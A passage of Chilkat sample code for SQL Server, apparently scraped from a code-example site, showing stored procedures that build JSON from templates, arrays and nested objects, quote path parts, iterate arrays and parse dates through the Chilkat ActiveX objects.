    DECLARE @sTmp0 nvarchar(4000)
    --  One way to create JSON is to do it in a straightforward manner:
    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OASetProperty @json, 'EmitCompact', 0
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'id', '0001'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'type', 'donut'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'name', 'Cake'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'image.url', 'images/0001.jpg'
    EXEC sp_OAMethod @json, 'UpdateInt', @success OUT, 'image.width', 200
    EXEC sp_OAMethod @json, 'UpdateInt', @success OUT, 'image.height', 200
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'thumbnail.url', 'images/thumbnails/0001.jpg'
    EXEC sp_OAMethod @json, 'UpdateInt', @success OUT, 'thumbnail.width', 32
    EXEC sp_OAMethod @json, 'UpdateInt', @success OUT, 'thumbnail.height', 32
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  The JSON created by the above code:

    --  	{
    --  	  "id": "0001",
    --  	  "type": "donut",
    --  	  "name": "Cake",
    --  	  "image": {
    --  	    "url": "images/0001.jpg",
    --  	    "width": 200,
    --  	    "height": 200
    --  	  },
    --  	  "thumbnail": {
    --  	    "url": "images/thumbnails/0001.jpg",
    --  	    "width": 32,
    --  	    "height": 32
    --  	  }
    --  	}

    --  An alternative is to predefine a template, and then use it to emit with variable substitutions.
    --  For example:

    DECLARE @jsonTemplate int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @jsonTemplate OUT

    EXEC sp_OAMethod @jsonTemplate, 'UpdateString', @success OUT, 'id', '{$id}'
    EXEC sp_OAMethod @jsonTemplate, 'UpdateString', @success OUT, 'type', 'donut'
    EXEC sp_OAMethod @jsonTemplate, 'UpdateString', @success OUT, 'name', '{$name}'
    EXEC sp_OAMethod @jsonTemplate, 'UpdateString', @success OUT, 'image.url', '{$imageUrl}'
    --  The "i." indicates that it's an integer variable.
    EXEC sp_OAMethod @jsonTemplate, 'UpdateString', @success OUT, 'image.width', '{$i.imageWidth}'
    EXEC sp_OAMethod @jsonTemplate, 'UpdateString', @success OUT, 'image.height', '{$i.imageHeight}'
    EXEC sp_OAMethod @jsonTemplate, 'UpdateString', @success OUT, 'thumbnail.url', '{$thumbUrl}'
    EXEC sp_OAMethod @jsonTemplate, 'UpdateString', @success OUT, 'thumbnail.width', '{$i.thumbWidth}'
    EXEC sp_OAMethod @jsonTemplate, 'UpdateString', @success OUT, 'thumbnail.height', '{$i.thumbHeight}'
    --  Give this template a name.
    EXEC sp_OAMethod @jsonTemplate, 'Predefine', @success OUT, 'donut'

    --  --------------------------------------------------------------------------
    --  OK, the template is defined.  Defining a template can be done once
    --  at the start of your program, and you can discard the jsonTemplate object (it
    --  doesn't need to stick around..)

    --  Now we can create instances of the JSON object by name:
    DECLARE @jsonDonut int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @jsonDonut OUT

    EXEC sp_OASetProperty @jsonDonut, 'EmitCompact', 0
    EXEC sp_OAMethod @jsonDonut, 'LoadPredefined', @success OUT, 'donut'
    EXEC sp_OAMethod @jsonDonut, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  The output is this:

    --  	{
    --  	  "id": "{$id}",
    --  	  "type": "donut",
    --  	  "name": "{$name}",
    --  	  "image": {
    --  	    "url": "{$imageUrl}",
    --  	    "width": "{$i.imageWidth}",
    --  	    "height": "{$i.imageHeight}"
    --  	  },
    --  	  "thumbnail": {
    --  	    "url": "{$thumbUrl}",
    --  	    "width": "{$i.thumbWidth}",
    --  	    "height": "{$i.thumbHeight}"
    --  	  }
    --  	}

    --  Finally, we can substitute variables like this:
    DECLARE @donutValues int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.Hashtable', @donutValues OUT

    EXEC sp_OAMethod @donutValues, 'AddStr', @success OUT, 'id', '0001'
    EXEC sp_OAMethod @donutValues, 'AddStr', @success OUT, 'name', 'Cake'
    EXEC sp_OAMethod @donutValues, 'AddStr', @success OUT, 'imageUrl', 'images/0001.jpg'
    EXEC sp_OAMethod @donutValues, 'AddInt', @success OUT, 'imageWidth', 200
    EXEC sp_OAMethod @donutValues, 'AddInt', @success OUT, 'imageHeight', 200
    EXEC sp_OAMethod @donutValues, 'AddStr', @success OUT, 'thumbUrl', 'images/thumbnails/0001.jpg'
    EXEC sp_OAMethod @donutValues, 'AddInt', @success OUT, 'thumbWidth', 32
    EXEC sp_OAMethod @donutValues, 'AddInt', @success OUT, 'thumbHeight', 32

    --  Emit with variable substitutions:
    DECLARE @omitEmpty int
    SELECT @omitEmpty = 1
    EXEC sp_OAMethod @jsonDonut, 'EmitWithSubs', @sTmp0 OUT, @donutValues, @omitEmpty
    PRINT @sTmp0

    --  Output:

    --  	{
    --  	  "id": "0001",
    --  	  "type": "donut",
    --  	  "name": "Cake",
    --  	  "image": {
    --  	    "url": "images/0001.jpg",
    --  	    "width": 200,
    --  	    "height": 200
    --  	  },
    --  	  "thumbnail": {
    --  	    "url": "images/thumbnails/0001.jpg",
    --  	    "width": 32,
    --  	    "height": 32
    --  	  }
    --  	}

    --  Change some of the values:
    EXEC sp_OAMethod @donutValues, 'AddStr', @success OUT, 'id', '0002'
    EXEC sp_OAMethod @donutValues, 'AddStr', @success OUT, 'imageUrl', 'images/0002.jpg'
    EXEC sp_OAMethod @donutValues, 'AddStr', @success OUT, 'thumbUrl', 'images/thumbnails/0002.jpg'

    EXEC sp_OAMethod @jsonDonut, 'EmitWithSubs', @sTmp0 OUT, @donutValues, @omitEmpty
    PRINT @sTmp0

    --  Output:

    --  	{
    --  	  "id": "0002",
    --  	  "type": "donut",
    --  	  "name": "Cake",
    --  	  "image": {
    --  	    "url": "images/0002.jpg",
    --  	    "width": 200,
    --  	    "height": 200
    --  	  },
    --  	  "thumbnail": {
    --  	    "url": "images/thumbnails/0002.jpg",
    --  	    "width": 32,
    --  	    "height": 32
    --  	  }
    --  	}

    EXEC @hr = sp_OADestroy @json
    EXEC @hr = sp_OADestroy @jsonTemplate
    EXEC @hr = sp_OADestroy @jsonDonut
    EXEC @hr = sp_OADestroy @donutValues


END
GO


https://www.example-code.com/sql/json_build_example_with_arrays.asp


(SQL Server) Build JSON with Mixture of Arrays and Objects
Another example showing how to build JSON containing a mixture of arrays and objects.


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    --  We want to build the following JSON:

    --  {
    --    "accountEnabled": true,
    --    "assignedLicenses": [
    --      {
    --        "disabledPlans": [ "bea13e0c-3828-4daa-a392-28af7ff61a0f" ],
    --        "skuId": "skuId-value"
    --      }
    --    ],
    --    "assignedPlans": [
    --      {
    --        "assignedDateTime": "datetime-value",
    --        "capabilityStatus": "capabilityStatus-value",
    --        "service": "service-value",
    --        "servicePlanId": "bea13e0c-3828-4daa-a392-28af7ff61a0f"
    --      }
    --    ],
    --    "businessPhones": [
    --      "businessPhones-value"
    --    ],
    --    "city": "city-value",
    --    "companyName": "companyName-value"
    --  }

    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OAMethod @json, 'UpdateBool', @success OUT, 'accountEnabled', 1
    EXEC sp_OASetProperty @json, 'I', 0
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'assignedLicenses[i].disabledPlans[0]', 'bea13e0c-3828-4daa-a392-28af7ff61a0f'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'assignedLicenses[i].skuId', 'skuId-value'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'assignedPlans[i].assignedDateTime', 'datetime-value'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'assignedPlans[i].capabilityStatus', 'capabilityStatus-value'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'assignedPlans[i].service', 'service-value'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'assignedPlans[i].servicePlanId', 'bea13e0c-3828-4daa-a392-28af7ff61a0f'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'businessPhones[i]', 'businessPhones-value'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'city', 'city-value'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'companyName', 'companyName-value'

    EXEC sp_OASetProperty @json, 'EmitCompact', 0
    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  Output:

    --  {
    --    "accountEnabled": true,
    --    "assignedLicenses": [
    --      {
    --        "disabledPlans": [
    --          "bea13e0c-3828-4daa-a392-28af7ff61a0f"
    --        ],
    --        "skuId": "skuId-value"
    --      }
    --    ],
    --    "assignedPlans": [
    --      {
    --        "assignedDateTime": "datetime-value",
    --        "capabilityStatus": "capabilityStatus-value",
    --        "service": "service-value",
    --        "servicePlanId": "bea13e0c-3828-4daa-a392-28af7ff61a0f"
    --      }
    --    ],
    --    "businessPhones": [
    --      "businessPhones-value"
    --    ],
    --    "city": "city-value",
    --    "companyName": "companyName-value"
    --  }

    EXEC @hr = sp_OADestroy @json


END
GO


https://www.example-code.com/sql/json_quoted_paths.asp


(SQL Server) JSON Paths that need Double Quotes
This example explains and demonstrates the situations where parts within a JSON path need to be enclosed in double-quotes.


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    --  Imagine we have the following JSON:

    --  	{
    --  	  "Meta Data": {
    --  	    "1: Symbol": "MSFT",
    --  	    "2: Indicator": "Relative Strength Index (RSI)",
    --  	    "3: Last Refreshed": "2017-07-28 09:30:00",
    --  	    "4: Interval": "15min",
    --  	    "5: Time Period": 10,
    --  	    "6: Series Type": "close",
    --  	    "7: Time Zone": "US/Eastern Time"
    --  	  },
    --  	  "Technical Analysis: RSI": {
    --  	    "2017-07-28 09:30": {
    --  	      "RSI": "38.6964"
    --  	    },
    --  	    "2017-07-27 16:00": {
    --  	      "RSI": "50.0088"
    --  	    }
    --  	}

    --  The path to the RSI valud 38.6964 is Technical Analysis: RSI.2017-07-28 09:30.RSI

    --  Whenever a path part contains a SPACE or "." char, that part must be enclosed
    --  in double quotes.  For example:

    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OAMethod @json, 'LoadFile', @success OUT, 'qa_data/json/rsi.json'


    EXEC sp_OAMethod @json, 'StringOf', @sTmp0 OUT, '"Technical Analysis: RSI"."2017-07-28 09:30".RSI'
    PRINT 'RSI: ' + @sTmp0

    --  output is 38.6964

    EXEC @hr = sp_OADestroy @json


END
GO



https://www.example-code.com/sql/json_create_array.asp



(SQL Server) Create a JSON Array Containing an Object
Creates a top-level JSON array containing an object.


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @jArray int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonArray', @jArray OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OAMethod @jArray, 'AddObjectAt', @success OUT, 0
    DECLARE @json int
    EXEC sp_OAMethod @jArray, 'ObjectAt', @json OUT, 0

    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'groupId', ''
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'sku', ''
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'title', ''
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'barcode', ''
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'category', ''
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'description', ''
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'images[0]', 'url1'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'images[1]', 'url...'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'isbn', ''
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'link', ''
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'linkLomadee', ''
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'prices[0].type', ''
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'prices[0].price', '0'
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'prices[0].priceLomadee', '0'
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'prices[0].priceCpa', '0'
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'prices[0].installment', '0'
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'prices[0].installmentValue', '0'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'productAttributes."Atributo 1"', 'Valor 1'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'productAttributes."Atributo ..."', 'Valor ...'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'technicalSpecification."Especificação 1"', 'Valor'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'technicalSpecification."Especificação ..."', 'Valor ...'
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'quantity', '0'
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'sizeHeight', '0'
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'sizeLength', '0'
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'sizeWidth', '0'
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'weightValue', '0'
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'declaredPrice', '0'
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'handlingTimeDays', '0'
    EXEC sp_OAMethod @json, 'UpdateBool', @success OUT, 'marketplace', 0
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'marketplaceName', ''

    EXEC sp_OASetProperty @jArray, 'EmitCompact', 0
    EXEC sp_OAMethod @jArray, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  The output of this program is:

    --  [
    --    {
    --      "groupId": "",
    --      "sku": "",
    --      "title": "",
    --      "barcode": "",
    --      "category": "",
    --      "description": "",
    --      "images": [
    --        "url1",
    --        "url..."
    --      ],
    --      "isbn": "",
    --      "link": "",
    --      "linkLomadee": "",
    --      "prices": [
    --        {
    --          "type": "",
    --          "price": 0,
    --          "priceLomadee": 0,
    --          "priceCpa": 0,
    --          "installment": 0,
    --          "installmentValue": 0
    --        }
    --      ],
    --      "productAttributes": {
    --        "Atributo 1": "Valor 1",
    --        "Atributo ...": "Valor ..."
    --      },
    --      "technicalSpecification": {
    --        "Especificação 1": "Valor",

    --        "Especificação ...": "Valor ..."

    --      },
    --      "quantity": 0,
    --      "sizeHeight": 0,
    --      "sizeLength": 0,
    --      "sizeWidth": 0,
    --      "weightValue": 0,
    --      "declaredPrice": 0,
    --      "handlingTimeDays": 0,
    --      "marketplace": false,
    --      "marketplaceName": ""
    --    }
    --  ]

    EXEC @hr = sp_OADestroy @jArray


END
GO




https://www.example-code.com/sql/json_array_iterate.asp


(SQL Server) Iterate over JSON Array containing JSON Objects
Demonstrates how to load a JSON array and iterate over the JSON objects.

CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    --  Loads the following JSON array and iterates over the objects:
    -- 
    --  [
    --  {"tagId":95,"tagDescription":"hola 1","isPublic":true},
    --  {"tagId":98,"tagDescription":"hola 1","isPublic":true},
    --  {"tagId":101,"tagDescription":"hola 1","isPublic":true},
    --  {"tagId":104,"tagDescription":"hola 1","isPublic":true},
    --  {"tagId":107,"tagDescription":"hola 1","isPublic":true},
    --  {"tagId":110,"tagDescription":"hola 1","isPublic":true},
    --  {"tagId":113,"tagDescription":"hola 1","isPublic":true},
    --  {"tagId":114,"tagDescription":"hola 2","isPublic":true},
    --  {"tagId":111,"tagDescription":"hola 2","isPublic":true},
    --  {"tagId":108,"tagDescription":"hola 2","isPublic":true},
    --  {"tagId":105,"tagDescription":"hola 2","isPublic":true},
    --  {"tagId":102,"tagDescription":"hola 2","isPublic":true},
    --  {"tagId":99,"tagDescription":"hola 2","isPublic":true},
    --  {"tagId":96,"tagDescription":"hola 2","isPublic":true},
    --  {"tagId":97,"tagDescription":"hola 3","isPublic":true},
    --  {"tagId":100,"tagDescription":"hola 3","isPublic":true},
    --  {"tagId":103,"tagDescription":"hola 3","isPublic":true},
    --  {"tagId":106,"tagDescription":"hola 3","isPublic":true},
    --  {"tagId":109,"tagDescription":"hola 3","isPublic":true},
    --  {"tagId":112,"tagDescription":"hola 3","isPublic":true},
    --  {"tagId":115,"tagDescription":"hola 3","isPublic":true},
    --  {"tagId":93,"tagDescription":"new tag","isPublic":true},
    --  {"tagId":94,"tagDescription":"new tag","isPublic":true},
    --  {"tagId":89,"tagDescription":"tag 1","isPublic":true},
    --  {"tagId":90,"tagDescription":"tag 2","isPublic":true},
    --  {"tagId":91,"tagDescription":"tag private 1","isPublic":false},
    --  {"tagId":92,"tagDescription":"tag private 2","isPublic":false}
    --  ]

    --  Load a file containing the above JSON..
    DECLARE @sbJsonArray int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.StringBuilder', @sbJsonArray OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    DECLARE @success int
    EXEC sp_OAMethod @sbJsonArray, 'LoadFile', @success OUT, 'qa_data/json/arraySample.json', 'utf-8'

    DECLARE @arr int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonArray', @arr OUT

    EXEC sp_OAMethod @arr, 'LoadSb', @success OUT, @sbJsonArray

    DECLARE @tagId int

    DECLARE @tagDescription nvarchar(4000)

    DECLARE @isPublic int

    DECLARE @i int
    SELECT @i = 0
    DECLARE @count int
    EXEC sp_OAGetProperty @arr, 'Size', @count OUT
    DECLARE @obj int

    WHILE @i < @count
      BEGIN
        EXEC sp_OAMethod @arr, 'ObjectAt', @obj OUT, @i
        EXEC sp_OAMethod @obj, 'IntOf', @tagId OUT, 'tagId'
        EXEC sp_OAMethod @obj, 'StringOf', @tagDescription OUT, 'tagDescription'
        EXEC sp_OAMethod @obj, 'BoolOf', @isPublic OUT, 'isPublic'


        PRINT 'tagId: ' + @tagId

        PRINT 'tagDescription: ' + @tagDescription

        PRINT 'isPublic: ' + @isPublic

        PRINT '--'

        EXEC @hr = sp_OADestroy @obj

        SELECT @i = @i + 1
      END

    EXEC @hr = sp_OADestroy @sbJsonArray
    EXEC @hr = sp_OADestroy @arr


END
GO

https://www.example-code.com/sql/json_insert_object.asp


(SQL Server) Insert JSON Object into another JSON Object
Demonstrates how to insert one JSON object into another. Effectively, the JSON object must be copied into the other..


CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @sTmp0 nvarchar(4000)
    --  Imagine we have two separate JSON objects.
    DECLARE @jsonA int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @jsonA OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OAMethod @jsonA, 'UpdateString', @success OUT, 'animal', 'zebra'
    EXEC sp_OAMethod @jsonA, 'UpdateString', @success OUT, 'colors[0]', 'white'
    EXEC sp_OAMethod @jsonA, 'UpdateString', @success OUT, 'colors[1]', 'black'

    EXEC sp_OASetProperty @jsonA, 'EmitCompact', 0
    EXEC sp_OAMethod @jsonA, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  jsonA contains:

    --  {
    --    "animal": "zebra",
    --    "colors": [
    --      "white",
    --      "black"
    --    ]
    --  }

    DECLARE @jsonB int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @jsonB OUT

    EXEC sp_OAMethod @jsonB, 'UpdateString', @success OUT, 'type', 'mammal'
    EXEC sp_OAMethod @jsonB, 'UpdateBool', @success OUT, 'carnivore', 0

    EXEC sp_OASetProperty @jsonB, 'EmitCompact', 0
    EXEC sp_OAMethod @jsonB, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  jsonB contains:

    --  {
    --    "type": "mammal",
    --    "carnivore": false
    --  }

    --  Let's say we want to insert jsonB into jsonA to get this:

    --  {
    --    "animal": "zebra",
    --    "info" " { 
--       "type": "mammal",
    --        "carnivore": false
    --  	},
    --    "colors": [
    --      "white",
    --      "black"
    --    ]
    --  }

    --  First add an empty object at the desired location:
    EXEC sp_OAMethod @jsonA, 'AddObjectAt', @success OUT, 1, 'info'

    --  Get the JSON object at that location, and load the JSON..
    DECLARE @jsonInfo int
    EXEC sp_OAMethod @jsonA, 'ObjectOf', @jsonInfo OUT, 'info'
    EXEC sp_OAMethod @jsonB, 'Emit', @sTmp0 OUT
    EXEC sp_OAMethod @jsonInfo, 'Load', @success OUT, @sTmp0
    EXEC @hr = sp_OADestroy @jsonInfo

    EXEC sp_OAMethod @jsonA, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  The end result is this:

    --  {
    --    "animal": "zebra",
    --    "info": {
    --      "type": "mammal",
    --      "carnivore": false
    --    },
    --    "colors": [
    --      "white",
    --      "black"
    --    ]
    --  }

    EXEC @hr = sp_OADestroy @jsonA
    EXEC @hr = sp_OADestroy @jsonB


END
GO



https://www.example-code.com/sql/json_date_parsing.asp


(SQL Server) JSON Date Parsing
Demonstrates how to parse date/time strings from JSON.

Note: This example uses the DtOf and DateOf methods introduced in Chilkat v9.5.0.73



CREATE PROCEDURE ChilkatSample
AS
BEGIN
    DECLARE @hr int
    DECLARE @iTmp0 int
    DECLARE @iTmp1 int
    DECLARE @iTmp2 int
    DECLARE @iTmp3 int
    DECLARE @iTmp4 int
    DECLARE @sTmp0 nvarchar(4000)
    DECLARE @success int

    DECLARE @json int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.JsonObject', @json OUT
    IF @hr <> 0
    BEGIN
        PRINT 'Failed to create ActiveX component'
        RETURN
    END

    EXEC sp_OASetProperty @json, 'EmitCompact', 0

    --  First, let's create JSON containing some date/time strings.
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'test.timestamp', '2018-01-30T20:35:00Z'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'test.rfc822', 'Tue, 24 Apr 2018 08:47:03 -0500'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'test.dateStrings[0]', '2018-01-30T20:35:00Z'
    EXEC sp_OAMethod @json, 'UpdateString', @success OUT, 'test.dateStrings[1]', 'Tue, 24 Apr 2018 08:47:03 -0500'
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'test.StartLoggingTime', '1446834998.695'
    EXEC sp_OAMethod @json, 'UpdateNumber', @success OUT, 'test.Expiration', '1442877512.0'
    EXEC sp_OAMethod @json, 'UpdateInt', @success OUT, 'test.StartTime', 1518867432

    EXEC sp_OAMethod @json, 'Emit', @sTmp0 OUT
    PRINT @sTmp0

    --  We've built the following JSON:

    --  {
    --    "test": {
    --      "timestamp": "2018-01-30T20:35:00Z",
    --      "rfc822": "Tue, 24 Apr 2018 08:47:03 -0500",
    --      "dateStrings": [
    --        "2018-01-30T20:35:00Z",
    --        "Tue, 24 Apr 2018 08:47:03 -0500"
    --      ],
    --      "StartLoggingTime": 1446834998.695,
    --      "Expiration": 1442877512.0,
    --      "StartTime": 1518867432
    --    }
    --  }

    --  Use the DateOf and DtOf methods to load Chilkat date/time objects with the date/time values.
    --  The CkDateTime object is primarily for loading a date/time from numerous formats, and then getting
    --  the date/time in various formats.  Thus, it's primarly for date/time format conversion.
    --  The DtObj object holds a date/time where the individual components (day, month, year, hour, minutes, etc.) are
    --  immediately accessible as integers.
    DECLARE @dateTime int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.CkDateTime', @dateTime OUT

    DECLARE @dt int
    EXEC @hr = sp_OACreate 'Chilkat_9_5_0.DtObj', @dt OUT

    DECLARE @getAsLocal int
    SELECT @getAsLocal = 0

    --  Load the date/time at test.timestamp into the dateTime object.
    EXEC sp_OAMethod @json, 'DateOf', @success OUT, 'test.timestamp', @dateTime
    EXEC sp_OAMethod @dateTime, 'GetAsTimestamp', @sTmp0 OUT, @getAsLocal
    PRINT @sTmp0
    EXEC sp_OAMethod @dateTime, 'GetAsUnixTime', @iTmp0 OUT, 0
    PRINT @iTmp0
    EXEC sp_OAMethod @dateTime, 'GetAsRfc822', @sTmp0 OUT, @getAsLocal
    PRINT @sTmp0

    EXEC sp_OAMethod @json, 'DateOf', @success OUT, 'test.rfc822', @dateTime
    EXEC sp_OAMethod @dateTime, 'GetAsTimestamp', @sTmp0 OUT, @getAsLocal
    PRINT @sTmp0

    EXEC sp_OASetProperty @json, 'I', 0
    EXEC sp_OAMethod @json, 'DateOf', @success OUT, 'test.dateStrings[i]', @dateTime
    EXEC sp_OAMethod @dateTime, 'GetAsTimestamp', @sTmp0 OUT, @getAsLocal
    PRINT @sTmp0

    EXEC sp_OASetProperty @json, 'I', 1
    EXEC sp_OAMethod @json, 'DateOf', @success OUT, 'test.dateStrings[i]', @dateTime
    EXEC sp_OAMethod @dateTime, 'GetAsTimestamp', @sTmp0 OUT, @getAsLocal
    PRINT @sTmp0

    EXEC sp_OAMethod @json, 'DateOf', @success OUT, 'test.StartLoggingTime', @dateTime
    EXEC sp_OAMethod @dateTime, 'GetAsTimestamp', @sTmp0 OUT, @getAsLocal
    PRINT @sTmp0

    EXEC sp_OAMethod @json, 'DateOf', @success OUT, 'test.Expiration', @dateTime
    EXEC sp_OAMethod @dateTime, 'GetAsTimestamp', @sTmp0 OUT, @getAsLocal
    PRINT @sTmp0

    EXEC sp_OAMethod @json, 'DateOf', @success OUT, 'test.StartTime', @dateTime
    EXEC sp_OAMethod @dateTime, 'GetAsTimestamp', @sTmp0 OUT, @getAsLocal
    PRINT @sTmp0

    --  Output so far:

    --  	2018-01-30T20:35:00Z
    --  	1517344500
    --  	Tue, 30 Jan 2018 20:35:00 GMT
    --  	2018-04-24T13:47:03Z
    --  	2018-01-30T20:35:00Z
    --  	2018-04-24T13:47:03Z
    --  	2015-11-07T00:36:38Z
    --  	2015-09-22T04:18:32Z
    --  	2018-02-17T17:37:12Z

    --  Now load the date/time strings into the dt object:
    EXEC sp_OAMethod @json, 'DtOf', @success OUT, 'test.timestamp', @getAsLocal, @dt

    EXEC sp_OAGetProperty @dt, 'Month', @iTmp0 OUT

    EXEC sp_OAGetProperty @dt, 'Day', @iTmp1 OUT

    EXEC sp_OAGetProperty @dt, 'Year', @iTmp2 OUT

    EXEC sp_OAGetProperty @dt, 'Hour', @iTmp3 OUT

    EXEC sp_OAGetProperty @dt, 'Minute', @iTmp4 OUT
    PRINT 'month=' + @iTmp0 + ', day=' + @iTmp1 + ', year=' + @iTmp2 + ', hour=' + @iTmp3 + ', minute=' + @iTmp4

    EXEC sp_OAMethod @json, 'DtOf', @success OUT, 'test.rfc822', @getAsLocal, @dt

    EXEC sp_OAGetProperty @dt, 'Month', @iTmp0 OUT

    EXEC sp_OAGetProperty @dt, 'Day', @iTmp1 OUT

    EXEC sp_OAGetProperty @dt, 'Year', @iTmp2 OUT

    EXEC sp_OAGetProperty @dt, 'Hour', @iTmp3 OUT

    EXEC sp_OAGetProperty @dt, 'Minute', @iTmp4 OUT
    PRINT 'month=' + @iTmp0 + ', day=' + @iTmp1 + ', year=' + @iTmp2 + ', hour=' + @iTmp3 + ', minute=' + @iTmp4

    EXEC sp_OASetProperty @json, 'I', 0
    EXEC sp_OAMethod @json, 'DtOf', @success OUT, 'test.dateStrings[i]', @getAsLocal, @dt

    EXEC sp_OAGetProperty @dt, 'Month', @iTmp0 OUT

    EXEC sp_OAGetProperty @dt, 'Day', @iTmp1 OUT

    EXEC sp_OAGetProperty @dt, 'Year', @iTmp2 OUT

    EXEC sp_OAGetProperty @dt, 'Hour', @iTmp3 OUT

    EXEC sp_OAGetProperty @dt, 'Minute', @iTmp4 OUT
    PRINT 'month=' + @iTmp0 + ', day=' + @iTmp1 + ', year=' + @iTmp2 + ', hour=' + @iTmp3 + ', minute=' + @iTmp4

    EXEC sp_OASetProperty @json, 'I', 1
    EXEC sp_OAMethod @json, 'DtOf', @success OUT, 'test.dateStrings[i]', @getAsLocal, @dt

    EXEC sp_OAGetProperty @dt, 'Month', @iTmp0 OUT

    EXEC sp_OAGetProperty @dt, 'Day', @iTmp1 OUT

    EXEC sp_OAGetProperty @dt, 'Year', @iTmp2 OUT

    EXEC sp_OAGetProperty @dt, 'Hour', @iTmp3 OUT

    EXEC sp_OAGetProperty @dt, 'Minute', @iTmp4 OUT
    PRINT 'month=' + @iTmp0 + ', day=' + @iTmp1 + ', year=' + @iTmp2 + ', hour=' + @iTmp3 + ', minute=' + @iTmp4

    EXEC sp_OAMethod @json, 'DtOf', @success OUT, 'test.StartLoggingTime', @getAsLocal, @dt

    EXEC sp_OAGetProperty @dt, 'Month', @iTmp0 OUT

    EXEC sp_OAGetProperty @dt, 'Day', @iTmp1 OUT

    EXEC sp_OAGetProperty @dt, 'Year', @iTmp2 OUT

    EXEC sp_OAGetProperty @dt, 'Hour', @iTmp3 OUT

    EXEC sp_OAGetProperty @dt, 'Minute', @iTmp4 OUT
